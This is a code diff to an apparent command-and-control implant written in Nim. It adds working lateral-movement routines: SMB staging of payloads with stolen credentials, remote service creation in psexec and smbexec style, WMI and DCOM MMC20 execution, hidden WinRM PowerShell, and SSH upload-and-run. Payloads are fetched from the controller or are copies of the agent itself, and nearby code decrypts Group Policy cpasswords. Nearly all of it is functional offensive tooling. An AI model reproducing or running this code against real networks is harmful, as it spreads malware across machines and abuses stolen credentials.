@@ -672,7 +672,26 @@ when defined(windows):
       output.add("file: " & f & "\ncpassword: " & cpass & "\nplaintext: " & dec.strip() & "\n\n")
     return if output == "": "no cpasswords found" else: output
 
-  proc doLateral(meth, host, user, pass, cmd: string): string =
+  proc smbStage(host, name, user, pass: string; data: seq[byte]): string =
+    ## Upload data to the remote host via SMB (ADMIN$ then C$\Windows\Temp).
+    ## Returns the remote Windows path on success, "" on failure.
+    if user != "" and pass != "":
+      discard runShell("net use \\\\" & host & "\\IPC$ \"" & pass & "\" /user:\"" & user & "\" 2>&1")
+    defer:
+      if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete /y 2>&1")
+    let unc1 = "\\\\" & host & "\\ADMIN$\\" & name
+    let unc2 = "\\\\" & host & "\\C$\\Windows\\Temp\\" & name
+    try:
+      writeFile(unc1, cast[string](data))
+      return "C:\\Windows\\" & name
+    except: discard
+    try:
+      writeFile(unc2, cast[string](data))
+      return "C:\\Windows\\Temp\\" & name
+    except: discard
+    return ""
+
+  proc doLateral(meth, host, user, pass, cmd: string; payData: seq[byte] = @[]): string =
     if meth == "atexec":
       var out2 = ""
       if user != "":
@@ -696,7 +715,106 @@ when defined(windows):
       Sleep(DWORD(3000))
       out2.add(runShell("schtasks /Delete /TN " & tn & " /F 2>&1") & "\n")
       return "[+] runas → " & ru & " @ " & host & "\n    cmd: " & cmd & "\n" & out2
-    return "unknown lateral method: " & meth
+    elif meth == "psexec":
+      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
+      let exeName = svcName & ".exe"
+      let remotePath = smbStage(host, exeName, user, pass, payData)
+      if remotePath == "": return "psexec: SMB staging failed"
+      var whost = newWideCString("\\\\" & host)
+      let hScm = OpenSCManagerW(whost, nil, SC_MANAGER_ALL_ACCESS)
+      if hScm == 0: return "psexec: OpenSCManager failed: " & $GetLastError()
+      defer: discard CloseServiceHandle(hScm)
+      var wsvcName = newWideCString(svcName)
+      var wexePath = newWideCString(remotePath)
+      let hSvc = CreateServiceW(hScm, wsvcName, wsvcName, SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+        wexePath, nil, nil, nil, nil, nil)
+      if hSvc == 0: return "psexec: CreateService failed: " & $GetLastError()
+      defer: discard CloseServiceHandle(hSvc)
+      discard StartServiceW(hSvc, 0, nil)
+      discard DeleteService(hSvc)
+      return "[+] psexec → " & host & "\n    svc: " & svcName & "\n    path: " & remotePath
+    elif meth == "wmi":
+      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
+      let exeName = svcName & ".exe"
+      let remotePath = smbStage(host, exeName, user, pass, payData)
+      if remotePath == "": return "wmi: SMB staging failed"
+      var wmicCmd: string
+      if user != "" and pass != "":
+        let parts = user.split('\\')
+        let dom = if parts.len > 1: parts[0] else: "."
+        let usr = if parts.len > 1: parts[1] else: user
+        wmicCmd = "wmic /node:\"" & host & "\" /user:\"" & dom & "\\" & usr &
+                  "\" /password:\"" & pass & "\" process call create \"" & remotePath & "\""
+      else:
+        wmicCmd = "wmic /node:\"" & host & "\" process call create \"" & remotePath & "\""
+      let out2 = runShell(wmicCmd)
+      return "[+] wmi → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
+    elif meth == "smbexec":
+      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
+      let exeName = svcName & ".exe"
+      let remotePath = smbStage(host, exeName, user, pass, payData)
+      if remotePath == "": return "smbexec: SMB staging failed"
+      let binPath = "C:\\Windows\\System32\\cmd.exe /Q /c start \"\" /min \"" & remotePath & "\""
+      var whost = newWideCString("\\\\" & host)
+      let hScm = OpenSCManagerW(whost, nil, SC_MANAGER_ALL_ACCESS)
+      if hScm == 0: return "smbexec: OpenSCManager failed: " & $GetLastError()
+      defer: discard CloseServiceHandle(hScm)
+      var wsvcName = newWideCString(svcName)
+      var wbinPath = newWideCString(binPath)
+      let hSvc = CreateServiceW(hScm, wsvcName, wsvcName, SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+        wbinPath, nil, nil, nil, nil, nil)
+      if hSvc == 0: return "smbexec: CreateService failed: " & $GetLastError()
+      defer: discard CloseServiceHandle(hSvc)
+      discard StartServiceW(hSvc, 0, nil)
+      discard DeleteService(hSvc)
+      return "[+] smbexec → " & host & "\n    svc: " & svcName & "\n    chain: SERVICES.EXE→cmd.exe→agent"
+    elif meth == "dcom":
+      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
+      let exeName = svcName & ".exe"
+      let remotePath = smbStage(host, exeName, user, pass, payData)
+      if remotePath == "": return "dcom: SMB staging failed"
+      let safePath = remotePath.replace("\"", "\\\"")
+      let psCmd = "$c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','" &
+        host & "'));$c.Document.ActiveView.ExecuteShellCommand('" & safePath & "',$null,'','7')"
+      let shellCmd = "powershell -NoP -W Hidden -Exec Bypass -C \"" & psCmd.replace("\"", "\\\"") & "\""
+      let out2 = runShell(shellCmd)
+      return "[+] dcom → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
+    elif meth == "winrm":
+      let svcName = "svc" & toHex(uint32(getTime().toUnix() and 0xFFFFFFFF'i64), 8)
+      let exeName = svcName & ".exe"
+      let remotePath = smbStage(host, exeName, user, pass, payData)
+      if remotePath == "": return "winrm: SMB staging failed"
+      var psCmd: string
+      if user != "" and pass != "":
+        psCmd = "$c=New-Object PSCredential('" & user & "',(ConvertTo-SecureString '" & pass &
+                "' -AsPlainText -Force));Invoke-Command -ComputerName '" & host &
+                "' -Credential $c -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
+      else:
+        psCmd = "Invoke-Command -ComputerName '" & host & "' -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
+      let shellCmd = "powershell -NoP -W Hidden -Exec Bypass -C \"" & psCmd.replace("\"", "\\\"") & "\""
+      let out2 = runShell(shellCmd)
+      return "[+] winrm → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
+    elif meth == "ssh":
+      let exeName = "agent_" & $getTime().toUnix() & ".elf"
+      let remotePath = "/tmp/" & exeName
+      let tmpPath = getTempDir() & "\\" & exeName
+      try: writeFile(tmpPath, cast[string](payData)) except: return "ssh: failed to write temp file"
+      defer: (try: removeFile(tmpPath) except: discard)
+      let sshOpts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
+      let addr2 = if ':' in host: host else: host & ":22"
+      let hostPart = addr2.split(':')[0]
+      let portPart = if ':' in addr2: addr2.split(':')[1] else: "22"
+      let scpCmd = "scp -P " & portPart & " " & sshOpts & " \"" & tmpPath & "\" " &
+                   user & "@" & hostPart & ":" & remotePath
+      var out2 = runShell(scpCmd & " 2>&1") & "\n"
+      let execCmd = "ssh -p " & portPart & " " & sshOpts & " " & user & "@" & hostPart &
+                    " \"chmod +x " & remotePath & " && nohup " & remotePath & " </dev/null >/dev/null 2>&1 &\""
+      out2.add(runShell(execCmd & " 2>&1"))
+      return "[+] ssh → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
+    else:
+      return "unknown lateral method: " & meth & " — use psexec|wmi|smbexec|dcom|winrm|ssh|atexec|runas"
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Linux-specific procs
@@ -1687,20 +1805,24 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         let user        = j{"user"}.getStr()
         let pass        = j{"pass"}.getStr()
         var cmd         = j{"cmd"}.getStr()
+        var payData:    seq[byte] = @[]
         let payloadName = j{"payload"}.getStr()
-        if cmd == "" and payloadName != "":
+        if payloadName != "":
           if payloadName == "self":
-            cmd = getAppFilename()
+            payData = cast[seq[byte]](readFile(getAppFilename()))
+            if cmd == "": cmd = getAppFilename()
           else:
-            let payBytes = t.downloadFile(payloadName)
-            if payBytes.len == 0:
+            payData = t.downloadFile(payloadName)
+            if payData.len == 0:
               t.sendResult(id, "", "LATERAL: payload download failed"); return
-            let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
-            writeFile(tmpPath, payBytes)
-            cmd = tmpPath
+            if cmd == "":
+              let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
+              writeFile(tmpPath, cast[string](payData))
+              cmd = tmpPath
         if host == "": t.sendResult(id, "", "LATERAL requires host"); return
-        if cmd == "":  t.sendResult(id, "", "LATERAL requires cmd or payload"); return
-        t.sendResult(id, doLateral(meth, host, user, pass, cmd), "")
+        if cmd == "" and payData.len == 0:
+          t.sendResult(id, "", "LATERAL requires cmd or payload"); return
+        t.sendResult(id, doLateral(meth, host, user, pass, cmd, payData), "")
       except: t.sendResult(id, "", "lateral: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "LATERAL: not supported on Linux")
